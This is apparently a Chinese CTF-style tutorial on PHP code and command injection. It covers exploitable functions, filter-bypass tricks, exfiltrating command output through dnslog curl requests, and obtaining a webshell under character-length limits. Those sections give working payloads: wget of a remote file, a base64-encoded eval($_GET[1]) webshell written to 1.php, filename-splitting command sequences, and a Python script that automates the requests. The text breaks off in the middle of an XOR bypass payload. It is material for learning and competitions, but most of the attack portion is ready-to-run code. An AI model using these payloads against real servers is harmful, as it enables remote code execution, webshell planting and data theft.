        <content type="html"><![CDATA[<h3 id="代码-命令执行"><a href="#代码-命令执行" class="headerlink" title="代码/命令执行"></a>代码/命令执行</h3><h4 id="1-概念："><a href="#1-概念：" class="headerlink" title="1.概念："></a>1.概念：</h4><p>代码执行：控制PHP的代码，就是代码执行</p><p>命令执行：控制服务器含有的命令，即没有做过滤类似于<code>system()  eval()  exec()</code>  等函数</p><h4 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2.代码注入"></a>2.代码注入</h4><ul><li><code>eval()</code>传入的是一个完整的语句（把任何字符串当作代码执行）</li></ul><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#eval()函数实现命令执行</span><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span> <span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>assert()</code>（不常用）</li></ul><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#assert()函数实现命令执行</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token shell-comment comment">#$a =</span><span class="token string">'echo 12345;'</span><span class="token punctuation">;</span><span class="token shell-comment comment">#assert($a);</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'eval("echo '</span>pwd<span class="token string">';")'</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token number">123</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>mixed call_user_func(callable  $callback [, mixed $parameter [,mixed $... ]] )</code><ul><li>第一个参数$callback就是被调用的函数，第二个参数是给第一个参数的，作为第一个函数的参数。</li><li>可以调用任何内置函数或用户自定义的函数</li><li>除了：<code>array() echo() empty() eval() isset() list() print() 和 unset()</code> 等语言结构函数</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token shell-comment comment">#call_user_func函数</span><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'system'</span> <span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'pwd'</span> <span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">'assert'</span><span class="token punctuation">,</span><span class="token string">'phpinfo()'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>mixed call_user_func_array(callback $callback,array $param_arr)</code> <ul><li>callback 是被调用的函数，param_arr要被传入回调函数的数组</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'phpinfo()'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>string create_function(string $args,string $code)</code><ul><li>该函数会创建一个匿名函数</li><li>args 是要创建的匿名函数的参数，code是该匿名函数内的代码 </li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$code'</span><span class="token punctuation">,</span><span class="token string">'echo $code;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'hello'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//执行该函数</span><span class="token variable">$a</span> <span class="token operator">=</span><span class="token string">'phpinfo();'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//执行该函数</span><span class="token delimiter">?></span></code></pre><ul><li><code>preg_replace( mixed $pattern, mixed $replacement,mixed $subject [,int $limit=-1 [, int &amp;$count]])</code><ul><li>执行一个正则表达式的搜索和替换</li><li>/e修正符使preg_replace<strong>将 replacement参数当做PHP代码</strong>   (在适当的逆向引用和替换完之后，匹配不完成不执行)</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'phpinfo()'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/abc/e"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>array array_map (callable $callback，array $array1 [,array $... ] )</code><ul><li>array_map为数组的每个元素应用回调函数</li><li>eval()不可传入，可使用assert()</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>bool usort(array &amp;$array, callable $value_compare_func)</code><ul><li>usort 使用用户自定义的比较函数对数组中的值进行排序</li><li>注意用<strong>get</strong>传入至少两个参数用来比较，且PHPinfo不能放在usort的第二个参数上，直接放在第一个参数上就行</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token shell-comment comment">#usort($_GET);</span><span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>bool uasort(array $array,callable $value_compare_func)</code><ul><li>uasort -使用用户自定义的比较函数对数组中的值进行排序并保持索引关联</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$e</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uasort</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>${php代码}</code></li></ul><pre class=" language-php"><code class="language-php">  <span class="token delimiter">&lt;?php</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  $<span class="token punctuation">{</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token delimiter">?></span></code></pre><h4 id="3-命令注入"><a href="#3-命令注入" class="headerlink" title="3.命令注入"></a>3.命令注入</h4><ul><li><p><code>string system(string command,int &amp;return_var)</code></p><p>可以用来执行系统命令并将相应的执行结果输出</p></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'pwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>string exec(string command, array &amp;output, int &amp;return_var)</code><ul><li>命令执行结果的<strong>最后一行内容</strong>。如果你需要获取未经处理的全部输出数据，请使用<code>passthru()</code>函数。<br>如果想要获取命令的输出内容，请确保使用output参数。</li><li>command是要执行的命令</li><li>output是 获得执行命令输出的每一行 字符串</li><li>return_ var存放执行命令后的状态值</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token function">exec</span> <span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>void passthru(string command, int &amp;return_var)</code><ul><li>command是要执行的命令</li><li>return_var存放执行命令后的状态值</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>string shell_ exec (string command)</code><ul><li>command 是要执行的命令</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">she1l_exec</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><strong>``</strong> 两个反引号<ul><li>与shell_exec功能相同，执行shell命令并返回输出的字符串</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'pwd'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> `<span class="token variable">$a</span>`<span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li><code>bool ob_start([callback $output_callback [,int $chunk_size [, bool $erase ]]])</code><ul><li>ob_start 打 开输出控制缓冲</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span><span class="token string">'system'</span><span class="token punctuation">;</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$_GET[a]"</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="4-命令执行的绕过"><a href="#4-命令执行的绕过" class="headerlink" title="4.命令执行的绕过"></a>4.命令执行的绕过</h4><ul><li>php代码中包含system()命令，但是预定义了使用的函数，此时的绕过方法</li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rce</span> <span class="token operator">=</span><span class="token string">"echo"</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><ul><li>绕过的符号</li></ul><pre><code>换行符  %0a回车符  %0d连续指令  ;(分号)后台进程  &amp;管道符  |（逻辑判断符号） ||  &amp;&amp;</code></pre><ul><li>拼接方式绕过</li></ul><pre class=" language-shell"><code class="language-shell">a=l;b=s;$a$b  //拼接ls</code></pre><ul><li>base64 绕过</li></ul><pre><code>`echo d2hvYW1p|base64 -D`  //将whoami的base64解码后再用反引号(``)执行</code></pre><ul><li><code>substr string pos len</code></li></ul><pre><code>echo  &quot;${PATH:0:1}&quot;   //取PATH，从0位开始，取一位echo  `expr$IFS\substr\$IFS\$(pwd)\$IFS\1\$IFS\1` //百度expr的用法，此处好像不怎么能用哈</code></pre><h4 id="5-命令执行的空格代替"><a href="#5-命令执行的空格代替" class="headerlink" title="5.命令执行的空格代替"></a>5.命令执行的空格代替</h4><ul><li><code>&lt;</code>符号</li><li><code>$IFS 、${IFS} 、$IFS$9</code>：$9  意思是第九个参数</li><li><code>%09</code>  用于url传递</li></ul><h4 id="6-命令执行无回显的方法"><a href="#6-命令执行无回显的方法" class="headerlink" title="6.命令执行无回显的方法"></a>6.命令执行无回显的方法</h4><ul><li><p>判断：</p><ul><li>延时</li><li>HTTP请求：dnslog</li><li>DNS 请求：dnslog（dnslog.cn）  curl。。。。</li></ul></li><li><p>利用：</p><ul><li>写shell（直接写入/外部下载，需要联网）</li><li>http/dns等方式带出数据（通过构造curl xxxx.dnslog的域名，把数据带出）</li><li>注意xxxx.dnslog  中不能有空格，所以用sed命令将空格替换  <code>cat flag.php|sed s/[[:space:]]//</code></li></ul></li></ul><h4 id="7-可控字符串长度受限下getshell"><a href="#7-可控字符串长度受限下getshell" class="headerlink" title="7.可控字符串长度受限下getshell"></a>7.可控字符串长度受限下getshell</h4><ul><li><p>使用 <code>ls &gt; 1</code>进行命令执行测试</p></li><li><p>15个字符：限制字符长度，可能没有限制命令执行次数</p><ul><li>在远程wget一个文件，然后再执行一次改名的命令  <code>wget a.cn/1</code> <code>mv 1 1.php</code></li><li>直接写入getshell-php <code>echo 1234 &gt;&gt;q.php</code>，一次写不全就多追加几次（<code>eval($_GET[1]);</code>）</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>highlight_ <span class="token function">file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'too long'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><ul><li>7个字符：限制字符长度，可能没有限制命令执行次数<ul><li>思路 <code>ls&gt;a</code>会把ls的内容输入到a中</li><li><code>l&gt;a</code>：因为<code>l</code>不是命令，所以不会有内容，但是同样会生成a文件</li><li>通过 <code>l&gt;a</code>  <code>l&gt;b</code>等操作，生成一堆文件（文件名组合起来是一句话，一句话配合base64进行上传）配合 <code>\</code>进行命令拼接，命令拼接好放到一个中，用sh  执行文件，生成一句话或完成其他工作</li><li><code>ls -t</code>会按照文件最新的时间进行排序显示（解决了文件名的顺序问题）</li><li>再通过<code>ls -t &gt;a</code>命令，将文件名组合一起，放入某php文件中（实现getshell）</li></ul></li></ul><pre><code>echo PD9waHAgZWNhbCgkX0dFVFsxXSk7 | base64 -d &gt;1.php//PD9waHAgZWNhbCgkX0dFVFsxXSk7</code></pre><pre><code>w&gt;hp                  //file.txt 文件w&gt;l.p\\w&gt;d\&gt;\\               //此处容易出错，会显示有\n  回车w&gt;\ -\\w&gt;e64\\                //注意：eval($_GET[1]);   经过base64编码后为 ZXZhbCgkX0dFVFsxXSk7w&gt;bas\\                //在shell脚本中，\\的意思是命令换行分割，（可以与下一行的字符拼接到一块组成命令）w&gt;7\|\\w&gt;k\\w&gt;xXS\\w&gt;VFs\\w&gt;0dF\\w&gt;gkX\\w&gt;hbC\\w&gt;ZWN\\w&gt;HAg\\w&gt;9wa\\w&gt;PD\\w&gt;o\ \\             //此处有空格w&gt;ech\\ls -t&gt;0             //使用-t进行排序sh 0                    //这个脚本意思是把那句shell输出到 0 文件中，然后最后一句用sh执行0文件，生成一句话</code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">import</span> requestsurl1 <span class="token operator">=</span> <span class="token string">"http://xx.xx.xx.xx/index.php?1="</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> <span class="token keyword">in</span> f<span class="token punctuation">:</span>        url <span class="token operator">=</span> url1<span class="token operator">+</span> i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print "已经请求%S" % url</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://xx.xx.xx.xx/1.php"</span><span class="token punctuation">)</span><span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code<span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'ok'</span></code></pre><ul><li>5个字符，思路与7个字符的一样，只是 <code>ls -t&gt;f</code>，不符合标准，所以，在输入上面的命令之前，先构造一个能执行 <code>ls -t &gt;f</code>的shell（a），然后生成其他文件名，执行<code>a</code>（执行ls -t&gt;0），生成最终的get-shell。完成。<ul><li>关键是拆分<code>ls -t&gt;f</code> 命令</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//相关PHP代码</span><span class="token delimiter">&lt;?php</span><span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/www/sandbox/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"orange"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'reset'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>@<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'/bin/rm -rf'</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre class=" language-shell"><code class="language-shell">//5个字符：>ls\\ls>a           //由于文件名顺序的影响，先将"ls\"写入到a中>\ \\>-t\\>\>fls>>a          //此处将“ ”、“-t\”、“>f”、“ls”追加到a中sh a           //此shell即可实现 ls -t>v的功能               //此时将7个字符的命令重新组合，然后生成文件名即可               // echo PD9waHAgZWNhbCgkX0dFVFsxXSk7 | base64 -d >1.php>php>1.\\>\>\\>\ \\>-d\\>\ \\>64\\>se\\>ba\\>\ \\>\|\\>\ \\>k7\\>XS\\>sx\\>VF\\>dF\\>X0\\>gk\\>bC\\>Nh\\>ZW\\>Ag\\>aH\\>9w\\>PD\\>\ \\>ho\\>ec\\...               //文件名生成完成以后，使用sh a执行ls -t>f 语句，生成可“生成get-shell”的文件sh ash f          //执行生成的f</code></pre><ul><li>4个字符，思路类似于5个字符的，但是更难一点<ul><li>拆分 <code>ls -th&gt;f</code></li><li>注意：<code>*</code> 命令会将当前目录下的文件作为命令和参数输入。 <code>*v</code>同理<ul><li>如果当前目录下有一个文件名为<strong>ls</strong>，则在命令行中输入 <strong>***就会执行</strong>ls**命令（将文件名作为命令执行）</li></ul></li><li><code>dir</code>命令类似与<code>ls</code>，但显示时有些不同，输出内容之间带有空格</li><li><code>rev</code>命令将文件内容倒序输</li></ul></li></ul><pre class=" language-shell"><code class="language-shell">//4个字符：>dir        //此三句就是将 ls -th >f  拆分后倒过来写的，为了控制文件名顺序>f\>>ht->sl        //注意：此时目录中的文件为  dir  f>  ht-  sl*>v     //  * 的意思就是将这些文件名组合为一句命令并执行，就是执行“dir  f>  ht-  sl”        //使用输入输出重定向将结果输出到v文件中。（结果是  “f>  ht-  sl”）>rev*v>a    //组合的语句是“rev v>a”  意思：倒序输出v中内容，写入到a中，就是“ls -th>f”，完成ls语句构造        //此时将7个字符的命令重新组合，然后生成文件名即可        // echo PD9waHAgZWNhbCgkX0dFVFsxXSk7 | base64 -d >1.php>>>...        //文件名生成完成以后，使用sh a执行ls -th>f 语句，生成可“生成get-shell”的文件sh f    //执行生成的f</code></pre><h4 id="8-无字母数字get-shell"><a href="#8-无字母数字get-shell" class="headerlink" title="8.无字母数字get-shell"></a>8.无字母数字get-shell</h4><ul><li>思想：生成字母——将非字母数字的字符通过各种变换，最终能构造出a-z中任意一个字符<ul><li>异或：0^1 = 1；1^1 = 0；0^0 = 0；任何值与0异或，返回的都是它本身的值，将不同字符进行异或，得到新ASCII码，可为字母。</li><li>取反：使用SQL中宽字节的思路，中文会变成%xx%xx，此时可使用 <code>‘和’[1]</code>输出<strong>和</strong>这个字符串的第一个字符，<code>ord(‘和’[1])</code>转换为ASCII码，将该ASCII码取反，会得到一个新的ASCII码，该ASCII码可为字母。</li><li>自增： i++</li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//题目</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$hint = "php function getFlag() to get flag";</span><span class="token delimiter">?></span></code></pre><p>获取字符异或的结果：</p><pre class=" language-p&amp;amp;#39;y"><code class="language-p&amp;amp;#39;y">//获取字符异或的结果：a="~!@#$%^&*()_+=-`{}[]|\/?.,<>;:"for i in xrange(len(a)):    for j in xrange(len(a)):        if ( ord(a[i]) ^ ord(a[j]) )>64 and ( ord(a[i]) ^ ord(a[j]) )<91:            print "%s xor %s = %d"%( a[i],a[j],ord(a[i]) ^ ord(a[j]))        elif ( ord(a[i]) ^ ord(a[j]) )>96 and ( ord(a[i]) ^ ord(a[j]) )<122:            print "%s xor %s = %d"%( a[i],a[j],ord(a[i]) ^ ord(a[j]))</code></pre><pre><code>//上题的解题关键，绕过过滤，传入getFlag()//找到对应的字符&lt; xor [ = g  103&gt; xor [ = e  101] xor ) = t  116= xor { = F  70@ xor , = l  108^ xor ? = a  97&lt; xor [ = g  103//所以getFlag可以表示为：&#39;&lt;&gt;]=@^&lt;&#39; ^ &#39;[[){,?[&#39;//但是此时函数缺少括号()，在php中，将字符串复制给变量，然后变量后面跟一个括号，就可以作为函数来执行//此时传入的参数为：$_=&#39;&lt;&gt;]=@^&lt;&#39; ^ 